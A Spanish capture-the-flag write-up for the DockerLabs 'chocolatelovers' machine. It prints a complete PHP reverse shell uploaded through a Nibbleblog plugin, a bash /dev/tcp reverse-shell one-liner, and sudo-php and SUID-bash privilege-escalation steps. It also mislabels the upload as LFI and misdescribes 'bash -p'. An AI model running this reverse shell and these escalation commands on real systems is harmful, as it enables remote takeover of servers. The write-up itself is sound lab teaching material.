Desplegamos la máquina vulnerable poniendo en la terminal la línea de comandos **bash auto_deploy.sh chocolatelovers.tar** en la carpeta donde se encuentre el contenido extraído del zip.<br>
<ins>En este caso, la dirección IP de la máquina a vulnerar es la 172.17.0.2</ins>.

  ![image](https://github.com/user-attachments/assets/ac37740c-a77d-4608-a8e1-63ee20442d3e)

Ahora, realizamos un escaneo de puertos de la máquina para revisar los puertos abiertos existentes y los posibles servicios a atacar mediante el uso de esos puertos.

  ![image](https://github.com/user-attachments/assets/e2fffb11-25c1-4612-a4a2-3c69a3e99e5c)

Podemos ver que se encuentra abierto el puerto ***80***, correspondiente al servicio ***HTTP***.

Nos dirigimos al navegador y escribimos la dirección URL http://172.17.0.2:80:

  ![image](https://github.com/user-attachments/assets/843bf522-fcc3-4d95-a5ad-e455ec25114b)

Visualizamos el código fuente de la página web:

  ![image](https://github.com/user-attachments/assets/d53fb03c-a3f2-49cc-8143-d9103cd3986c)

Nos percatamos de que hay una serie de líneas comentadas que ponen "/nibbleblog". Escribimos esto detrás de la ruta que tenemos en el buscador para visualizar el posible subdirectorio web existente.

  ![image](https://github.com/user-attachments/assets/d458472f-8558-4573-9481-db7357288f47)

A continuación, se nos muestra la página de bienvenida del CMS Nibbleblog, que es empleado para la creación de sitios web sin requerimiento de una base de datos.

Vamos a obtener los subdirectorios existentes en la página web para conseguir visualizar otras páginas que puedan darnos más información.
Debido a que revisando el código fuente de la página y mediante el uso del comando ***ffuf*** para realizar fuzzing no detectamos nuevas páginas, vamos a emplear un comando similar llamado ***gobuster***, con el que obtendremos las páginas existentes en distintos formatos. En este caso, vamos a buscar aquellas que tengan extensión .*html*, .*php*, .*sh* y .*py*.

  ![image](https://github.com/user-attachments/assets/d3ce3e94-95e0-4cc3-beb9-2880970d0379)

El resultado de ejecutar el comando nos devuelve varios subdirectorios, nosotros nos fijaremos en "**/content**".

Antes de acceder al subdirectorio /content, vamos a **admin.php** para la búsqueda de algún plugin o template que nos permita el acceso a la máquina vulnerable mediante una reverse shell.

De los plugins que se encuentran nosotros usamos el que se llama "My image". Hacemos clic en **Install**.

  ![image](https://github.com/user-attachments/assets/90af0068-124c-4735-b64c-8efe1937cfaa)

  ![image](https://github.com/user-attachments/assets/13a01e89-2364-4485-8b3e-fa2652112b16)

El plugin se trata de un formulario en el que podemos realizar la subida de archivos al servidor. Con esto, podríamos realizar un ataque **LFI** (*Local File Inclusion*), el cual consiste en la capacidad de visualizar el contenido de archivos locales del servidor por parte del atacante, obteniendo así información confidencial, la cual puede ser usada para acceder al sistema.

Vamos a subir un archivo PHP con el que ejecutaremos una reverse shell. El código para hacer esto es el siguiente:
 
	   /*<?php /**/
	      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
	      $dis=@ini_get('disable_functions');
	      if(!empty($dis))
		{
	      $dis=preg_replace('/[, ]+/',',',$dis);
	      $dis=explode(',',$dis);
	      $dis=array_map('trim',$dis);
	     }
		else
		{
	      $dis=array();
	     }
	
	    $ipaddr='172.17.0.1';
	    $port=443;
	
	    if(!function_exists('WrisYTZ'))
		{
	      function WrisYTZ($c)
			{
	           global $dis;
	
	           if (FALSE !== stristr(PHP_OS, 'win' )) 
			  {
	             $c=$c." 2>&1\n";
	           }
	           $gPpr='is_callable';
	           $WEBa='in_array';
	
	            if($gPpr('passthru')&&!$WEBa('passthru',$dis))
			   {
	              ob_start();
	              passthru($c);
		         $o=ob_get_contents();
		         ob_end_clean();
	            }
			   else
	             if($gPpr('system')&&!$WEBa('system',$dis))
	             {
	               ob_start();
			      system($c);
			      $o=ob_get_contents();
			      ob_end_clean();
	             }
	             else
	              if($gPpr('shell_exec')&&!$WEBa('shell_exec',$dis))
	              {
	                $o=`$c`;
	              }
	              else
	               if($gPpr('popen')&&!$WEBa('popen',$dis))
	               {
	                 $fp=popen($c,'r');
	                 $o=NULL;
	                 if(is_resource($fp))
	                 {
	                  while(!feof($fp))
	                  {
	                    $o.=fread($fp,1024);
	                  }
	                 }
	                  @pclose($fp);
	              }
	              else
	                                    if($gPpr('proc_open')&&!$WEBa('proc_open',$dis))
			     {
	                  $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
	                  $o=NULL;
	                while(!feof($pipes[1]))
	                {
	                  $o.=fread($pipes[1],1024);
	                }
	                 @proc_close($handle);
	              }
	              else
	               if($gPpr('exec')&&!$WEBa('exec',$dis))
	               {
			        $o=array();
			        exec($c,$o);
			        $o=join(chr(10),$o).chr(10);
	               }
	               else
	               {
	                 $o=0;
	               }
	
	                return $o;
	            }
	          }
	         $nofuncs='no exec functions';
	    if(is_callable('fsockopen')and!in_array('fsockopen',$dis))
	    {
	       $s=@fsockopen("tcp://172.17.0.1",$port);
	      while($c=fread($s,2048))
	      {
	        $out = '';
	        if(substr($c,0,3) == 'cd ')
	        {
	          chdir(substr($c,3,-1));
	        } 
	        else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') 
	        {
	          break;
	        }
	        else
	        {
	          $out=WrisYTZ(substr($c,0,-1));
	          if($out===false)
	          {
	            fwrite($s,$nofuncs);
	            break;
	          }
	        }
	        fwrite($s,$out);
	     }
	      fclose($s);
	    }
	   else
	   {
	      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
	      @socket_connect($s,$ipaddr,$port);
	      @socket_write($s,"socket_create");
	      while($c=@socket_read($s,2048))
	      {
	        $out = '';
	        if(substr($c,0,3) == 'cd ')
	        {
	          chdir(substr($c,3,-1));
	        }
	        else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit')
	        {
	          break;
	        }
	        else
	        {
	          $out=WrisYTZ(substr($c,0,-1));
	          if($out===false)
	          {
	            @socket_write($s,$nofuncs);
	            break;
	          }
	        }
	        @socket_write($s,$out,strlen($out));
	      }
	      @socket_close($s);
	    }
		
  ![image](https://github.com/user-attachments/assets/4f129332-36d6-4d75-a175-7dc466f227c3)

Ahora nos dirigimos a la dirección http://172.17.0.2/nibbleblog/content:

  ![image](https://github.com/user-attachments/assets/34d30dbf-6e55-490d-8038-cd5786bafece)

Nos vamos al subdirectorio **private**.

  ![image](https://github.com/user-attachments/assets/4a65356a-987b-4611-93e0-6a39cd0c8f7d)

Luego hacemos clic en **plugins**.

  ![image](https://github.com/user-attachments/assets/59df7e3e-c562-49e0-bf77-13c0a5d4cef6)

Seleccionamos el subdirectorio del plugin que hemos utilizado (**my_image**).

  ![image](https://github.com/user-attachments/assets/dccb4868-c186-40a7-bed6-46549fc43a37)

Aquí se encuentra el archivo que hemos subido; el cual al no haberle asignado un nombre a la hora de subirlo al servidor, se le ha atribuido el nombre image al fichero por defecto.
	
Antes de ejecutar el archivo, escuchamos por NetCat por el puerto 443 para realizar la reverse shell.

  ![image](https://github.com/user-attachments/assets/0ee37657-df74-46f3-8a69-c291639bfc2b)

  ![image](https://github.com/user-attachments/assets/9f301d45-4498-42e4-a289-3b3d16b2a6b7)

Estamos dentro de la máquina, pero dado que la sesión no dura mucho y en pocos minutos se cierra la conexión a la máquina víctima, realizamos una reverse shell dentro de la conexión usando esta [página web](https://www.revshells.com/) para el código.

**bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"**

  ![image](https://github.com/user-attachments/assets/5b03fa59-e8b8-41f6-ba2b-c50aa2813228)

  ![image](https://github.com/user-attachments/assets/608717f9-f405-4918-a994-d29c2f6f96a3)

  Ahora podemos empezar con la búsqueda de información en el sistema para realizar la escalada de privilegios.

Somos el usuario *www-data* y revisando con el comando **sudo -l** los archivos binarios que es capaz de ejecutar este usuario, nos encontramos que somos capaces de ejecutar el binario /usr/bin/php como el usuario **chocolate**, sin necesidad de insertar la contraseña.

  ![image](https://github.com/user-attachments/assets/6d5cf550-b79f-4412-9a20-87a9bf02e74c)

Miramos en [GTFOBins](https://gtfobins.github.io/) acerca del binario ***/usr/bin/php***.

  ![image](https://github.com/user-attachments/assets/267a34b3-bf83-4bf1-8377-0547fec1d140)

**CMD="/bin/sh"<br>**
**sudo -u chocolate /usr/bin/php -r "system('$CMD');"**

  ![image](https://github.com/user-attachments/assets/4ef578fd-1092-40eb-b992-ed0f9212622f)

Usamos el comando **ps -e -f** para listar todos los procesos del sistema de manera detallada y nos encontramos con un proceso con ID 1 (*PID*).<br> 
Miramos su descripción:

  ![image](https://github.com/user-attachments/assets/c58e91c4-3613-4474-acb8-56ad4e14275e)

Este proceso hace referencia a un fichero que se ha ejecutado, el cual se encuentra en la ruta */opt/script.php*. Escribimos **cd /opt** en la terminal.

  ![image](https://github.com/user-attachments/assets/9e7e5b0c-316b-4294-8c28-44914d395cc8)

Dentro del archivo PHP ingresamos este código:

**<?php exec("chmod u+s /bin/bash"); ?>**

  ![image](https://github.com/user-attachments/assets/300837c4-3376-40c3-ad5f-623022f2cb6b)

Ejecutamos el comando **bash -p** para iniciar una instancia de consola con privilegios restringidos.

  ![image](https://github.com/user-attachments/assets/a5e82245-2684-4dda-802e-e3b79a63d573)

Finalmente, hemos logrado acceder al sistema como usuario root, por lo que contamos con todos los privilegios existentes.

Una vez finalizamos con la máquina de Dockerlabs presionamos **Ctrl+C** para eliminarla.

  ![image](https://github.com/user-attachments/assets/2fbae300-10be-4ece-bf7c-c28cc98cb267)
